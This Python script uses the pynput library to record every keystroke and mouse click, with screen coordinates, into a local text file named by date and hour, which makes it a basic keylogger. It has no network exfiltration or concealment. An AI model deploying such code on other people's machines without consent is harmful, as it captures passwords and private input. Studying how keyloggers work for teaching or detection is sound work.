from pynput import keyboard , mouse
import time

local_time = time.localtime()
day = local_time.tm_mday
mon = local_time.tm_mon
hour = local_time.tm_hour
def keyPressed(key):
    with open(f"{mon}_{day}_{hour}_.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            logKey.write(f"\n KEY: {key}\n")

def on_click(x, y, buon, preed):
    if preed:
        with open(f"{mon}_{day}_{hour}_.txt", "a") as logMouse:
            logMouse.write(f" \nMouse clicked  ({x}, {y}) \n {buon}\n")

if __name__ == "__main__":
    keyboard_listener = keyboard.Listener(on_press=keyPressed)

    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener.start()
    mouse_listener.start()
    input()